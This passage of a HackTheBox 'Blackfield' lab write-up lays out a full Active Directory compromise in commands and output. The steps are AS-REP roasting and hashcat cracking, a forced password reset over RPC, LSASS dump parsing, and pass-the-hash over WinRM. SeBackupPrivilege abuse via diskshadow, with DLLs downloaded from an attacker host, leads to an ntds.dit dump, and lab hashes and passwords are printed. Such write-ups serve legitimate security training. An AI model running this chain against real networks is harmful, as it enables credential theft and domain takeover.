WZelazny D 0 Wed Jun 3 17:47:12 2020 XBemelen D 0 Wed Jun 3 17:47:12 2020 XDadant D 0 Wed Jun 3 17:47:12 2020 XDebes D 0 Wed Jun 3 17:47:12 2020 XKonegni D 0 Wed Jun 3 17:47:12 2020 XRykiel D 0 Wed Jun 3 17:47:12 2020 YBleasdale D 0 Wed Jun 3 17:47:12 2020 YHuftalin D 0 Wed Jun 3 17:47:12 2020 YKivlen D 0 Wed Jun 3 17:47:12 2020 YKozlicki D 0 Wed Jun 3 17:47:12 2020 YNyirenda D 0 Wed Jun 3 17:47:12 2020 YPredestin D 0 Wed Jun 3 17:47:12 2020 YSeturino D 0 Wed Jun 3 17:47:12 2020 YSkoropada D 0 Wed Jun 3 17:47:12 2020 YVonebers D 0 Wed Jun 3 17:47:12 2020 YZarpentine D 0 Wed Jun 3 17:47:12 2020 ZAlatti D 0 Wed Jun 3 17:47:12 2020 ZKrenselewski D 0 Wed Jun 3 17:47:12 2020 ZMalaab D 0 Wed Jun 3 17:47:12 2020 ZMiick D 0 Wed Jun 3 17:47:12 2020 ZScozzari D 0 Wed Jun 3 17:47:12 2020 ZTimofeeff D 0 Wed Jun 3 17:47:12 2020 ZWausik D 0 Wed Jun 3 17:47:12 2020 5102079 blocks of size 4096. 1697641 blocks available └─$ smbclient -N //10.10.10.192/forensic Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls NT_STATUS_ACCESS_DENIED listing \\* smb: \\\u0026gt; Each directory is empty But we can use it to create a userlist and try AS-REP-roasting └─$ impacket-GetNPUsers -usersfile users.list -dc-ip 10.10.10.192 blackfield.local/ Impacket v0.11.0 - Copyright 2023 Fortra [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) ... $krb5asrep$23$support@BLACKFIELD.LOCAL:1f10d897a1b644a032f41814413ebe39$b16365d416a55a510ac198406233651071444fb1de08ba43529cd7dad0a9ca5025653e234e9ee14f3cbafabb4a492089bfdf57e1b7e2328003154bafdb0bcea191020a3dce2f3aac242166054e1c32c90f2fc1f932f0c92a62bf3d30a1ce26539d5d0b14143f0e409b7c66eeefb1c7fc5c900b17595a083fb23ae675f82d9eae5b02fef0f5178b1f35ca50fd98b3f5adff177028626db9ccccbf841746a01fa7d734f9fbc6f91b62a9a676c1f188a48624c771b75652b4cf94df83849e7bdcb6b9797c4176c3e0e7327b41c3610fcb162b0279f313c79a06c9d3cb127f606198db65bf5c2bae16a91b5b9ec05e5337ef0c623eb2 [-] User svc_backup doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set ... Crack it with hashcat support:#00^BlackKnight └─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 3.1+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ... $krb5asrep$23$support@BLACKFIELD.LOCAL:1f10d897a1b644a032f41814413ebe39$b16365d416a55a510ac198406233651071444fb1de08ba43529cd7dad0a9ca5025653e234e9ee14f3cbafabb4a492089bfdf57e1b7e2328003154bafdb0bcea191020a3dce2f3aac242166054e1c32c90f2fc1f932f0c92a62bf3d30a1ce26539d5d0b14143f0e409b7c66eeefb1c7fc5c900b17595a083fb23ae675f82d9eae5b02fef0f5178b1f35ca50fd98b3f5adff177028626db9ccccbf841746a01fa7d734f9fbc6f91b62a9a676c1f188a48624c771b75652b4cf94df83849e7bdcb6b9797c4176c3e0e7327b41c3610fcb162b0279f313c79a06c9d3cb127f606198db65bf5c2bae16a91b5b9ec05e5337ef0c623eb2:#00^BlackKnight Session..........: hashcat Status...........: Cracked Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP) Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:1f10d897a1b6...623eb2 Time.Started.....: Sun Sep 17 19:11:50 2023 (13 secs) Time.Estimated...: Sun Sep 17 19:12:03 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1089.9 kH/s (0.41ms) @ Accel:256 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 14336000/14344385 (99.94%) Rejected.........: 0/14336000 (0.00%) Restore.Point....: 14335488/14344385 (99.94%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: #1*6)0 -\u0026gt; #!hrvert Hardware.Mon.#1..: Util: 91% Started: Sun Sep 17 19:11:49 2023 Stopped: Sun Sep 17 19:12:05 2023 The creds are valid But no winrm access └─$ crackmapexec smb 10.10.10.192 -u support -p \u0026#39;#00^BlackKnight\u0026#39; SMB 10.10.10.192 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) SMB 10.10.10.192 445 DC01 [+] BLACKFIELD.local\\support:#00^BlackKnight └─$ crackmapexec winrm 10.10.10.192 -u support -p \u0026#39;#00^BlackKnight\u0026#39; SMB 10.10.10.192 5985 DC01 [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) HTTP 10.10.10.192 5985 DC01 [*] http://10.10.10.192:5985/wsman WINRM 10.10.10.192 5985 DC01 [-] BLACKFIELD.local\\support:#00^BlackKnight User #1 Nothing new in smb except for SYSVOL and NETLOGON └─$ smbmap -u support -p \u0026#39;#00^BlackKnight\u0026#39; -H 10.10.10.192 [+] IP: 10.10.10.192:445 Name: BLACKFIELD.local Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share forensic NO ACCESS Forensic / Audit share. IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share profiles$ READ ONLY SYSVOL READ ONLY Logon server share No Kerberoastable users └─$ impacket-GetUserSPNs blackfield.local/\u0026#39;support\u0026#39;:\u0026#39;#00^BlackKnight\u0026#39; -dc-ip dc01.blackfield.local -request Impacket v0.11.0 - Copyright 2023 Fortra No entries found! ldapsearch to retrieve samaccountname of domain controller └─$ ldapsearch -H ldap://10.10.10.192 -x -b \u0026#34;DC=blackfield,DC=local\u0026#34; -D \u0026#39;support@blackfield.local\u0026#39; -w \u0026#39;#00^BlackKnight\u0026#39; # extended LDIF # # LDAPv3 # base \u0026lt;DC=blackfield,DC=local\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # BLACKFIELD.local dn: DC=BLACKFIELD,DC=local objectClass: top objectClass: domain objectClass: domainDNS ... dn: CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local objectClass: top objectClass: person objectClass: organizationalPerson objectClass: user objectClass: computer cn: DC01 distinguishedName: CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local instanceType: 4 whenCreated: 20200223111400.0Z whenChanged: 20230918021908.0Z uSNCreated: 12293 uSNChanged: 233542 name: DC01 objectGUID:: yKWttevtGU+AkuFOUWYvng== userAccountControl: 532480 badPwdCount: 0 codePage: 0 countryCode: 0 badPasswordTime: 132269516749519355 lastLogoff: 0 lastLogon: 133395347215321691 localPolicyFlags: 0 pwdLastSet: 133394771382736467 primaryGroupID: 516 objectSid:: AQUAAAAAAAUVAAAA3sEE+lnfq4Ei72nU6AMAAA== accountExpires: 9223372036854775807 logonCount: 134 sAMAccountName: DC01$ sAMAccountType: 805306369 operatingSystem: Windows Server 2019 Standard operatingSystemVersion: 10.0 (17763) serverReferenceBL: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=C onfiguration,DC=BLACKFIELD,DC=local dNSHostName: DC01.BLACKFIELD.local ... Let\u0026rsquo;s launch bloodhound └─$ bloodhound-python -c all -u support -p \u0026#39;#00^BlackKnight\u0026#39; -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192 --zip INFO: Found AD domain: blackfield.local INFO: Getting TGT for user INFO: Connecting to LDAP server: dc01.blackfield.local INFO: Kerberos auth to LDAP failed, trying NTLM INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 18 computers INFO: Connecting to LDAP server: dc01.blackfield.local INFO: Kerberos auth to LDAP failed, trying NTLM INFO: Found 316 users INFO: Found 52 groups INFO: Found 2 gpos INFO: Found 1 ous INFO: Found 19 containers INFO: Found 0 trusts support has ForceChangePassword rights over audit2020 Let\u0026rsquo;s change audit2020\u0026rsquo;s password via RPC https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#forcechangepassword └─$ rpcclient -U blackfield.local/support dc01.blackfield.local Password for [BLACKFIELD.LOCAL\\support]: rpcclient $\u0026gt; setuserinfo2 audit2020 23 P@ssw0rd!@# rpcclient $\u0026gt; └─$ crackmapexec smb 10.10.10.192 -u audit2020 -p \u0026#39;P@ssw0rd!@#\u0026#39; SMB 10.10.10.192 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) SMB 10.10.10.192 445 DC01 [+] BLACKFIELD.local\\audit2020:P@ssw0rd!@# But no winrm └─$ crackmapexec winrm 10.10.10.192 -u audit2020 -p \u0026#39;P@ssw0rd!@#\u0026#39; SMB 10.10.10.192 5985 DC01 [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) HTTP 10.10.10.192 5985 DC01 [*] http://10.10.10.192:5985/wsman WINRM 10.10.10.192 5985 DC01 [-] BLACKFIELD.local\\audit2020:P@ssw0rd!@# ## User #2 But we have access to forensic └─$ smbmap -u audit2020 -p \u0026#39;P@ssw0rd!@#\u0026#39; -H 10.10.10.192 [+] IP: 10.10.10.192:445 Name: BLACKFIELD.local Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share forensic READ ONLY Forensic / Audit share. IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share profiles$ READ ONLY SYSVOL READ ONLY Logon server share Let\u0026rsquo;s check the content └─$ smbmap -u audit2020 -p \u0026#39;P@ssw0rd!@#\u0026#39; -H 10.10.10.192 -R \u0026#39;forensic\u0026#39; [+] IP: 10.10.10.192:445 Name: BLACKFIELD.local Disk Permissions Comment ---- ----------- ------- forensic READ ONLY .\\forensic\\* dr--r--r-- 0 Sun Feb 23 15:10:16 2020 . dr--r--r-- 0 Sun Feb 23 15:10:16 2020 .. dr--r--r-- 0 Sun Feb 23 18:14:37 2020 commands_output dr--r--r-- 0 Thu May 28 21:29:24 2020 memory_analysis dr--r--r-- 0 Fri Feb 28 22:30:34 2020 tools .\\forensic\\commands_output\\* dr--r--r-- 0 Sun Feb 23 18:14:37 2020 . dr--r--r-- 0 Sun Feb 23 18:14:37 2020 .. fr--r--r-- 528 Sun Feb 23 18:12:54 2020 domain_admins.txt fr--r--r-- 962 Sun Feb 23 18:12:54 2020 domain_groups.txt fr--r--r-- 16454 Fri Feb 28 22:32:17 2020 domain_users.txt fr--r--r-- 518202 Sun Feb 23 18:12:54 2020 firewall_rules.txt fr--r--r-- 1782 Sun Feb 23 18:12:54 2020 ipconfig.txt fr--r--r-- 3842 Sun Feb 23 18:12:54 2020 netstat.txt fr--r--r-- 3976 Sun Feb 23 18:12:54 2020 route.txt fr--r--r-- 4550 Sun Feb 23 18:12:54 2020 systeminfo.txt fr--r--r-- 9990 Sun Feb 23 18:12:54 2020 tasklist.txt .\\forensic\\memory_analysis\\* dr--r--r-- 0 Thu May 28 21:29:24 2020 . dr--r--r-- 0 Thu May 28 21:29:24 2020 .. fr--r--r-- 37876530 Thu May 28 21:29:24 2020 conhost.zip fr--r--r-- 24962333 Thu May 28 21:29:24 2020 ctfmon.zip fr--r--r-- 23993305 Thu May 28 21:29:24 2020 dfsrs.zip fr--r--r-- 18366396 Thu May 28 21:29:24 2020 dllhost.zip fr--r--r-- 8810157 Thu May 28 21:29:24 2020 ismserv.zip fr--r--r-- 41936098 Thu May 28 21:29:24 2020 lsass.zip fr--r--r-- 64288607 Thu May 28 21:29:24 2020 mmc.zip fr--r--r-- 13332174 Thu May 28 21:29:24 2020 RuntimeBroker.zip fr--r--r-- 131983313 Thu May 28 21:29:24 2020 ServerManager.zip fr--r--r-- 33141744 Thu May 28 21:29:24 2020 sihost.zip fr--r--r-- 33756344 Thu May 28 21:29:24 2020 smartscreen.zip fr--r--r-- 14408833 Thu May 28 21:29:24 2020 svchost.zip fr--r--r-- 34631412 Thu May 28 21:29:24 2020 taskhostw.zip fr--r--r-- 14255089 Thu May 28 21:29:24 2020 winlogon.zip fr--r--r-- 4067425 Thu May 28 21:29:24 2020 wlms.zip fr--r--r-- 18303252 Thu May 28 21:29:24 2020 WmiPrvSE.zip ... We have lsass file in memory_analysis folder Let\u0026rsquo;s check it └─$ smbclient //10.10.10.192/forensic -U \u0026#39;audit2020%P@ssw0rd!@#\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; cd memory_analysis\\ smb: \\memory_analysis\\\u0026gt; get lsass.zip parallel_read returned NT_STATUS_IO_TIMEOUT smb: \\memory_analysis\\\u0026gt; getting file \\memory_analysis\\lsass.zip of size 41936098 as lsass.zip SMBecho failed (NT_STATUS_CONNECTION_DISCONNECTED). The connection is disconnected now To solve this issue we can mount the share └─$ sudo mount -t cifs -o \u0026#39;username=audit2020,password=P@ssw0rd!@#\u0026#39; //10.10.10.192/forensic/memory_analysis /mnt/smb/ └─$ ls /mnt/smb conhost.zip ctfmon.zip dfsrs.zip dllhost.zip ismserv.zip lsass.zip mmc.zip RuntimeBroker.zip ServerManager.zip sihost.zip smartscreen.zip svchost.zip taskhostw.zip winlogon.zip wlms.zip WmiPrvSE.zip └─$ cp /mnt/smb/lsass.zip ./ Unzip the memory dump and pass it to pypykatz https://github.com/skelsec/pypykatz └─$ pypykatz lsa minidump lsass.DMP INFO:pypykatz:Parsing file lsass.DMP FILE: ======== lsass.DMP ======= == LogonSession == authentication_id 406458 (633ba) session_id 2 username svc_backup domainname BLACKFIELD logon_server DC01 logon_time 2020-02-23T18:00:03.423728+00:00 sid S-1-5-21-4194615774-2175524697-3563712290-1413 luid 406458 == MSV == Username: svc_backup Domain: BLACKFIELD LM: NA NT: 9658d1d1dcd9250115e2205d9f48400d SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c DPAPI: a03cd8e9d30171f3cfe8caad92fef621 == WDIGEST [633ba]== username svc_backup domainname BLACKFIELD password None password (hex) == Kerberos == Username: svc_backup Domain: BLACKFIELD.LOCAL == WDIGEST [633ba]== username svc_backup domainname BLACKFIELD password None password (hex) ... Now we can winrm using the hash └─$ crackmapexec winrm 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d SMB 10.10.10.192 5985 DC01 [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) HTTP 10.10.10.192 5985 DC01 [*] http://10.10.10.192:5985/wsman WINRM 10.10.10.192 5985 DC01 [+] BLACKFIELD.local\\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!) └─$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt; Root We have a note in C:\\ *Evil-WinRM* PS C:\\\u0026gt; type notes.txt Mates, After the domain compromise and computer forensic last week, auditors advised us to: - change every passwords -- Done. - change krbtgt password twice -- Done. - disable auditor\u0026#39;s account (audit2020) -- KO. - use nominative domain admin accounts instead of this one -- KO. We will probably have to backup \u0026amp; restore things later. - Mike. PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt) whoami *Evil-WinRM* PS C:\\\u0026gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled *Evil-WinRM* PS C:\\\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Backup Operators Alias S-1-5-32-551 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\High Mandatory Level Label S-1-16-12288 We have SeBackupPrivilege and we are Backup Operators Download the dlls Follow one of these posts: https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/ https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/ https://juggernaut-sec.com/sebackupprivilege/ Let\u0026rsquo;s try reg save to download system and sam and then pypykatz or secretsdump *Evil-WinRM* PS C:\\\u0026gt; reg save hklm\\sam C:\\ProgramData\\SAM The operation completed successfully. *Evil-WinRM* PS C:\\\u0026gt; reg save hklm\\SYSTEM C:\\ProgramData\\SYSTEM The operation completed successfully. *Evil-WinRM* PS C:\\programdata\u0026gt; download sam Info: Downloading C:\\programdata\\sam to sam Info: Download successful! *Evil-WinRM* PS C:\\programdata\u0026gt; download system Info: Downloading C:\\programdata\\system to system Info: Download successful! └─$ pypykatz registry --sam sam system WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work ============== SYSTEM hive secrets ============== CurrentControlSet: ControlSet001 Boot Key: 73d83e56de8961ca9f243e1a49638393 ============== SAM hive secrets ============== HBoot Key: 1d645695662cc2a70d54ee626104485110101010101010101010101010101010 Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Or └─$ impacket-secretsdump -sam sam -system system local Impacket v0.11.0 - Copyright 2023 Fortra [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn\u0026#39;t have hash information. [*] Cleaning up... But we can\u0026rsquo;t winrm as Administrator └─$ evil-winrm -i 10.10.10.192 -u administrator -H 67ef902eae0d740df6257f273de75051 Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError Error: Exiting with code 1 Let\u0026rsquo;s try dll method *Evil-WinRM* PS C:\\users\\svc_backup\u0026gt; iwr 10.10.16.9/SeBackupPrivilegeCmdLets.dll -outfile SeBackupPrivilegeCmdLets.dll *Evil-WinRM* PS C:\\users\\svc_backup\u0026gt; iwr 10.10.16.9/SeBackupPrivilegeUtils.dll -outfile SeBackupPrivilegeUtils.dll *Evil-WinRM* PS C:\\users\\svc_backup\u0026gt; ls Directory: C:\\users\\svc_backup Mode LastWriteTime Length Name ---- ------------- ------ ---- d-r--- 2/23/2020 9:16 AM 3D Objects d-r--- 2/23/2020 9:16 AM Contacts d-r--- 2/28/2020 2:26 PM Desktop d-r--- 2/23/2020 9:16 AM Documents d-r--- 2/23/2020 9:16 AM Downloads d-r--- 2/23/2020 9:16 AM Favorites d-r--- 2/23/2020 9:16 AM Links d-r--- 2/23/2020 9:16 AM Music d-r--- 2/23/2020 9:16 AM Pictures d-r--- 2/23/2020 9:16 AM Saved Games d-r--- 2/23/2020 9:16 AM Searches d-r--- 2/23/2020 9:16 AM Videos -a---- 9/18/2023 4:35 PM 12288 SeBackupPrivilegeCmdLets.dll -a---- 9/18/2023 4:36 PM 16384 SeBackupPrivilegeUtils.dll *Evil-WinRM* PS C:\\users\\svc_backup\u0026gt; import-module .\\SeBackupPrivilegeCmdLets.dll *Evil-WinRM* PS C:\\users\\svc_backup\u0026gt; Import-Module .\\SeBackupPrivilegeUtils.dll *Evil-WinRM* PS C:\\users\\svc_backup\u0026gt; Copy-FileSeBackupPrivilege c:\\windows\\ntds\\ntds.dit c:\\users\\svc_backup\\downloads\\ntds.dit -overwrite Opening input file. - The process cannot access the file because it is being used by another process. (Exception from HRESULT: 0x80070020) At line:1 char:1 + Copy-FileSeBackupPrivilege c:\\windows\\ntds\\ntds.dit c:\\users\\svc_back ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [Copy-FileSeBackupPrivilege], Exception + FullyQualifiedErrorId : System.Exception,bz.OneOEight.SeBackupPrivilege.Copy_FileSeBackupPrivilege Another fail Let\u0026rsquo;s try diskshadow The payload from this post Set alias to trophy set context persistent nowriters set metadata c:\\programdata\\metadata.cab add volume c: alias trophy create expose %trophy% z: *Evil-WinRM* PS C:\\users\\svc_backup\u0026gt; diskshadow.exe /s C:\\users\\svc_backup\\diskshadow.txt Microsoft DiskShadow version 1.0 Copyright (C) 2013 Microsoft Corporation On computer: DC01, 9/18/2023 5:02:10 PM -\u0026gt; set context persistent nowriters -\u0026gt; set metadata c:\\programdata\\metadata.cab The existing file will be overwritten. -\u0026gt; add volume c: alias trophy -\u0026gt; create Alias trophy for shadow ID {f5e81929-aad5-44f9-87f9-4aa66006c3ef} set as environment variable. Alias VSS_SHADOW_SET for shadow set ID {94c54815-47e8-46fc-b1e7-f1caa65770ba} set as environment variable. Querying all shadow copies with the shadow copy set ID {94c54815-47e8-46fc-b1e7-f1caa65770ba} * Shadow copy ID = {f5e81929-aad5-44f9-87f9-4aa66006c3ef} %trophy% - Shadow copy set: {94c54815-47e8-46fc-b1e7-f1caa65770ba} %VSS_SHADOW_SET% - Original count of shadow copies = 1 - Original volume name: \\\\?\\Volume{6cd5140b-0000-0000-0000-602200000000}\\ [C:\\] - Creation time: 9/18/2023 5:02:11 PM - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2 - Originating machine: DC01.BLACKFIELD.local - Service machine: DC01.BLACKFIELD.local - Not exposed - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5} - Attributes: No_Auto_Release Persistent No_Writers Differential Number of shadow copies listed: 1 -\u0026gt; expose %trophy% z: -\u0026gt; %trophy% = {f5e81929-aad5-44f9-87f9-4aa66006c3ef} The shadow copy was successfully exposed as z:\\. -\u0026gt; Copy and download the ntds.dit *Evil-WinRM* PS C:\\users\\svc_backup\u0026gt; Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit .\\ntds.dit *Evil-WinRM* PS C:\\users\\svc_backup\u0026gt; ls Directory: C:\\users\\svc_backup Mode LastWriteTime Length Name ---- ------------- ------ ---- d-r--- 2/23/2020 9:16 AM 3D Objects d-r--- 2/23/2020 9:16 AM Contacts d-r--- 2/28/2020 2:26 PM Desktop d-r--- 2/23/2020 9:16 AM Documents d-r--- 2/23/2020 9:16 AM Downloads d-r--- 2/23/2020 9:16 AM Favorites d-r--- 2/23/2020 9:16 AM Links d-r--- 2/23/2020 9:16 AM Music d-r--- 2/23/2020 9:16 AM Pictures d-r--- 2/23/2020 9:16 AM Saved Games d-r--- 2/23/2020 9:16 AM Searches d-r--- 2/23/2020 9:16 AM Videos -a---- 9/18/2023 5:02 PM 132 diskshadow.txt -a---- 9/18/2023 5:02 PM 18874368 ntds.dit -a---- 9/18/2023 4:35 PM 12288 SeBackupPrivilegeCmdLets.dll -a---- 9/18/2023 4:36 PM 16384 SeBackupPrivilegeUtils.dll -a---- 9/18/2023 4:56 PM 272 shadow.txt *Evil-WinRM* PS C:\\users\\svc_backup\u0026gt; download ntds.dit Info: Downloading C:\\users\\svc_backup\\ntds.dit to ntds.dit Info: Download successful! Now we use impacket-secretsdump └─$ impacket-secretsdump -system system -ntds ntds.dit LOCAL Impacket v0.11.0 - Copyright 2023 Fortra [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d::: audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa::: support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212::: BLACKFIELD.local\\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c::: BLACKFIELD.local\\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c::: BLACKFIELD.local\\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c::: BLACKFIELD.local\\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c::: BLACKFIELD.local\\BLACKFIELD706381:1109:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c::: ... And now we can winrm as Administrator using his hash └─$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; ","date":"September 17, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/blackfield/images/blackfield.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/blackfield/","summary":"Blackfield Enumeration nmap └─$ nmap -Pn -p- 10.10.10.192 --min-rate 5000 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 18:54 BST Nmap scan report for 10.10.10.192 (10.10.10.192) Host is up (0.11s latency). Not shown: 65526 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 3268/tcp open globalcatLDAP 5985/tcp open wsman Nmap done: 1 IP address (1 host up) scanned in 35.","tags":["HTB","dns","ldap","ldapsearch","crackmapexec","smbmap","smbclient","as-rep-roast","hashcat","bloodhound","bloodhound-py","rpc-password-reset","pypykatz","evil-winrm","sebackupprivilege","copy-filesepackupprivilege","diskshadow","ntds","vss","secretsdump"],"title":"[HTB] Machine: Blackfield"},{"categories":null,"contents":"Breadcrumps 